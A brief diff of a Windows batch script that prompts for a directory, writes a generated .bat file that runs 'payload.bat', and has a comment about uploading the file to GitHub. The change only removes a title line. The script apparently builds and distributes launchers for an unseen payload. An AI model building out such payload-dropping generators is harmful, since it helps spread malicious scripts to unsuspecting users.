@@ -25,7 +25,6 @@ echo where would you like to create the files
 echo if directory does not exist it will be created
 set /p opt2=directory:
 :: create placeholder file
-Title generating...
 echo @echo off >%opt1%.bat
 echo payload.bat >>%opt1%.bat
 :: upload file to github
